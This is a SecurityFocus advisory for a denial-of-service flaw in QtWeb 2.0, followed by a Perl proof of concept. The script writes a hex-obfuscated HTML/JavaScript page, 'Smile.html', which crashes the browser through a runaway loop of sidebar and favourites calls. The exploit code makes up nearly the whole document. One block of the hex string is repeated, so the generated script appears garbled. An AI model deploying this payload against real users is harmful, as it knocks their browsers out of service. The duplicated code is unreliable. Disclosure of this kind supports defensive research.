source: http://www.securityfocus.com/bid/34327/info

QtWeb browser is prone to a remote denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected application, denying service to legitimate users.

QtWeb 2.0 is vulnerable; other versions may also be affected.


                              $S="\x3C\x68\x74\x6D\x6C\x3E\x0D\x0A".
                         "\x3C\x74\x69\x74\x6C\x65\x3E\x51\x74\x57\x65\x62".
                 "\x20\x49\x6E\x74\x65\x72\x6E\x65\x74\x20\x42\x72\x6F\x77\x73\x65".
             "\x72\x20\x32".                                             "\x2E\x30\x20".
         "\x28\x62".                                                             "\x75\x69".
     "\x6C\x64".                                                                     "\x20\x30".
 "\x34\x33".                                                                             "\x29\x20".
 "\x52\x65".                                                                             "\x6D\x6F".
 "\x74\x65".                                                                             "\x20\x44".
 "\x65\x6E".                                                                             "\x69\x61".
 "\x6C\x20".                                                                             "\x6F\x66".
 "\x20\x53".                                                                             "\x65\x72".
 "\x76\x69".                                                                             "\x63\x65".
 "\x20\x45".                                                                             "\x78\x70".
 "\x6C\x6F".            "\x69\x74".                             "\x3C\x2F".              "\x54\x69".
 "\x74\x6C".        "\x65".     "\x3E".                     "\x0D".     "\x0A".          "\x3C\x68".
 "\x65\x61".    "\x64".             "\x3E".             "\x3C".             "\x62".      "\x6F\x64".
 "\x79\x3E".  "\x3C".                 "\x73".         "\x63".                 "\x72".    "\x69\x70".
 "\x74\x20".                                                                             "\x74\x79".
 "\x70\x65".                                                                             "\x3D\x22".
 "\x74\x65".                                                                             "\x78\x74".
 "\x2F\x6A".                                                                             "\x61\x76".
 "\x61\x73".                                                                             "\x63\x72".
 "\x69\x70".                                                                             "\x74\x22".
 "\x3E\x0D".                                                                             "\x0A\x61".
 "\x6C\x65".                                                                             "\x72\x74".
 "\x28\x22".                                                                             "\x51\x74".
 "\x57\x65".                                                                             "\x62\x20".
 "\x49\x6E".                                                                             "\x74\x65".
 "\x72\x6E".                                                                             "\x65\x74".
 "\x20\x42".                                                                             "\x72\x6F".
 "\x77\x73".                                                                             "\x65\x72".
 "\x20\x32".                                                                             "\x2E\x30".
 "\x20\x28".    "\x62".                                                         "\x75".  "\x69\x6C".
 "\x64\x20".     "\x30".                                                       "\x34".   "\x33\x29".
 "\x20\x52".      "\x65".                                                     "\x6D".    "\x6F\x74".
 "\x65\x20".        "\x44".                                                 "\x65".      "\x6E\x69".
 "\x61\x6C".         "\x20".                                               "\x6F".       "\x66\x20".
 "\x53\x65".            "\x72".                                         "\x76".          "\x69\x63".
 "\x65\x20".             "\x45".                                       "\x78".           "\x70\x6C".
 "\x6F\x69".               "\x74".                                   "\x5C".             "\x6E\x5C".
 "\x6E\x5C".                 "\x74".                               "\x5C".               "\x74\x5C".
 "\x74\x62".                    "\x79".                         "\x20".                  "\x4C\x69".
 "\x71\x75".                       "\x69".                   "\x64".                     "\x57\x6F".
 "\x72\x6D".                          "\x20".             "\x28".                        "\x63\x29".
 "\x20\x32".                             "\x30".       "\x30".                           "\x39\x22".
 "\x29\x3B".                                "\x0D\x0A\x66".                              "\x75\x6E".
 "\x63\x74".                                                                             "\x69\x6F".
 "\x6E\x20".                                                                             "\x64\x6F".
 "\x7A\x28".                                                                             "\x29\x20".
 "\x7B\x0D".                                                                             "\x0A\x74".
 "\x69\x74".                                                                             "\x6C\x65".

 "\x71\x75".                       "\x69".                   "\x64".                     "\x57\x6F".
 "\x72\x6D".                          "\x20".             "\x28".                        "\x63\x29".
 "\x20\x32".                             "\x30".       "\x30".                           "\x39\x22".
 "\x29\x3B".                                "\x0D\x0A\x66".                              "\x75\x6E".
 "\x63\x74".                                                                             "\x69\x6F".
 "\x6E\x20".                                                                             "\x64\x6F".
 "\x7A\x28".                                                                             "\x29\x20".
 "\x7B\x0D".                                                                             "\x0A\x74".
 "\x69\x74".                                                                             "\x6C\x65".
 "\x3D\x22".                                                                             "\x48\x6F".
 "\x74\x20".                                                                             "\x49\x63".
 "\x65\x22".                                                                             "\x3B\x0D".
     "\x0A\x75".                                                                     "\x72\x6C".
         "\x3D\x22".                                                             "\x68\x74".
             "\x74\x70\x3A".                                             "\x2F\x2F\x77".
                 "\x77\x77\x2E\x6D\x69\x6C\x77\x30\x72\x6D\x2E\x63\x6F\x6D\x2F".
                         "\x22\x3B\x0D\x0A\x69\x66\x20\x28\x77\x69\x6E\x64".
                              "\x6F\x77\x2E\x73\x69\x64\x65\x62";$M=




                                "\x61".       "\x72"          ."\x29".         "\x20".
                                 "\x7B".     "\x0D"       ."\x0A". "\x77".     "\x69".
                                   "\x6E"."\x64".         "\x6F".    "\x77".   "\x2E".
                                       "\x73".            "\x69".    "\x64".   "\x65".
                                       "\x62".            "\x61".    "\x72".   "\x2E".
                                       "\x61".            "\x64".    "\x64".   "\x50".
                                       "\x61".            "\x6E".    "\x65".   "\x6C".
                                       "\x28".            "\x74".    "\x69".   "\x74".
                                       "\x6C".            "\x65".    "\x2C".   "\x20".
                                       "\x75".            "\x72".    "\x6C".   "\x2C".
                                      "\x22".             "\x22".    "\x29".   "\x3B".
                                     "\x0D".                "\x0A"."\x7D".
                                    "\x20".                    "\x65".         "\x6C".
                                                                               "\x73";

     $I="\x65\x20\x69\x66\x28\x20\x77".
                "\x69\x6E\x64\x6F\x77".
                "\x2E\x65\x78\x74\x65\x72\x6E".
                        "\x61\x6C\x20\x29\x20". ##############
                        "\x7B\x0D\x0A\x77\x69\x6E\x64". ##   #
                                "\x6F\x77\x2E\x65"."\x78". ######
                                "\x74\x65\x72\x6E\x61". ##########       _         _         _
                        "\x6C\x2E\x41\x64\x64\x46\x61\x76\x6F\x72\x69". #==----   #==----   #==----
                                "\x74\x65\x28\x20\x75".
                                "\x72\x6C\x2C\x20\x74". ##===*
                        "\x69\x74\x6C\x65\x29\x3B\x0D".
                        "\x0A\x7D\x20\x65\x6C".
                "\x73\x65\x20\x69\x66\x28\x77".
                "\x69\x6E\x64\x6F\x77".
        "\x2E\x6F\x70\x65\x72\x61\x20";
                ####################


        $L="\x26\x26\x20\x77\x69\x6E\x64\x6F\x77\x2E".
                "\x70\x72\x69\x6E\x74\x29\x20\x7B".
                   "\x20\x0D\x0A\x72\x65\x74".
                        "\x75\x72\x6E\x20".
                          "\x28\x74\x72".
                            "\x75\x65".
                              "\x29".
                              "\x3B".
                            "\x20\x7D".
                          "\x7D\x0D\x0A".
                        "\x76\x61\x72\x20".
                   "\x61\x73\x6B\x20\x3D\x20".
                "\x63\x6F\x6E\x66\x69\x72\x6D\x28".
           "\x22\x50\x72\x65\x73\x73\x20\x4F\x4B\x20".
                "\x74\x6F\x20\x73\x74\x61\x72\x74".
                   "\x20\x74\x68\x65\x20\x44".
                        "\x6F\x53\x2E\x5C".
                          "\x6E\x50\x72".
                            "\x65\x73".
                              "\x73".
                              "\x20".
                            "\x4E\x6F".
                          "\x20\x74\x6F".
                        "\x20\x64\x6F\x64".
                   "\x67\x65\x20\x74\x68\x65".
                "\x20\x44\x6F\x53\x2E\x22\x29\x3B".
           "\x0D\x0A\x69\x66\x20\x28\x61\x73\x6B\x20".
                "\x3D\x3D\x20\x74\x72\x75\x65\x29".
                   "\x20\x7B\x20\x0D\x0A\x66".
                        "\x6F\x72\x20\x28".
                          "\x78\x3D\x30".
                            "\x3B\x20".
                              "\x78".
  "\x3C".
                            "\x78\x2B".
                          "\x31\x3B\x20".
                        "\x78\x2B\x2B\x29".
                   "\x20\x64\x6F\x7A\x28\x29".
                "\x3B\x0D\x0A\x7D\x20\x65\x6C\x73".
           "\x65\x09\x7B\x20\x61\x6C\x65\x72\x74\x28".
                "\x22\x4F\x6B\x20\x3A\x28\x22\x29".
                   "\x3B\x0D\x0A\x77\x69\x6E".
                        "\x64\x6F\x77\x2E".
                          "\x6C\x6F\x63".
                            "\x61\x74".
                              "\x69".
                              "\x6F".
                            "\x6E\x2E".
                          "\x68\x72\x65".
                        "\x66\x20\x3D\x20".
                   "\x22\x68\x74\x74\x70\x3A".
                "\x2F\x2F\x77\x77\x77\x2E\x71\x74".
           "\x77\x65\x62\x2E\x6E\x65\x74\x2F\x22\x3B";
      #########
        $E="\x0D\x0A\x7D\x20".
                "\x3C\x2F\x73\x63".
                        "\x72\x69\x70\x74".
                                "\x3E\x3C\x2F\x62".
                                        "\x6F\x64\x79\x3E".
                                                "\x3C\x2F\x68\x65".
                                                        "\x61\x64\x3E\x3C".
                                                                "\x2F\x68\x74\x6D".
                                                                        "\x6C\x3E";#####____

my $file = "Smile.html";
my $fun = $S.$M.$I.$L.$E;
open (mrowdiuqil, ">./$file") || die "\nMffff... $!\n";
print mrowdiuqil "$fun";
close (mrowdiuqil);
print "\n[+] File $file created with funny potion\!\n\n";
